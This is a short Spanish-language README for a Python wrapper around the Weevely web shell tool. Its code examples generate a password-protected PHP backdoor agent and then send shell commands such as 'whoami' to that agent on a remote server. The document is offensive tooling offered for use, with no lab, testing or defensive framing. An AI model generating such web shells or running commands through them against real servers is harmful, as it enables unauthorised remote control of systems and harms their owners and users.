# WeevelyWrapper
Una envoltura simplificada para Weevely que permite la generación de agentes y la ejecución de comandos en servidores remotos.

## Instalación
Asegúrate de tener Weevely y todas sus dependencias instaladas.

### Uso
*Importación*
Primero, importa la clase desde el archivo:

```python
from wrapper import WeevelyWrapper
```

### Generar un Agente
Para generar un nuevo agente para Weevely:

```python
wrapper = WeevelyWrapper()
agent_path = wrapper.generate_agent("your_secret_password", "path_to_save_agent.php")
print(f"Agent saved at: {agent_path}")
```

Ejecutar Comandos
Para ejecutar comandos en un servidor remoto con un agente Weevely ya establecido:

```python
result = wrapper.run_command("http://example.com/path_to_agent", "your_secret_password", "whoami")
print(result)
```
